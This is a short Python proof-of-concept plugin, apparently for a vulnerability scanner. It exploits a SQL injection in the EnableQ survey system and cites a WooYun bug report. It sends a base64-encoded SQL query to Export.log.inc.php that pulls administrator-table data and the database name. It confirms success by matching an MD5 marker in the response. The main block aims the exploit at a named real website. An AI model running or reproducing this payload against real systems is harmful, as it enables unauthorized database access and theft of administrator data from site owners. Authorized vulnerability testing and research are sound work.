#!/usr/bin/python
#-*- encoding:utf-8 -*-
# title:Enable全版本通杀SQL注入
#http://www.wooyun.org/bugs/wooyun-2010-088298

def assign(service, arg):
    if service == "enableq":
        return True, arg


def audit(arg):
    payload = 'enableq/enableq91_php52/Export/Export.log.inc.php?ExportSQL=U0VMRUNUIGEuKixjb25jYXQoTUQ1KDEpLCc6JyxkYXRhYmFzZSgpKSBhcyBhZG1pbmlzdHJhdG9yc05hbWUgRlJPTSBlcV9hZG1pbmlzdHJhdG9yc2xvZyBhLCBlcV9hZG1pbmlzdHJhdG9ycyBiIFdIRVJFIGEuYWRtaW5pc3RyYXRvcnNJRD1iLmFkbWluaXN0cmF0b3JzSUQgT1JERVIgQlkgYS5hZG1pbmlzdHJhdG9yc0xvZ0lEIERFU0M='
    url = arg + payload
    code, head,res, errcode, _ = curl.curl2(url)
    if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('enableq', 'http://www.caitec.org.cn/')[1])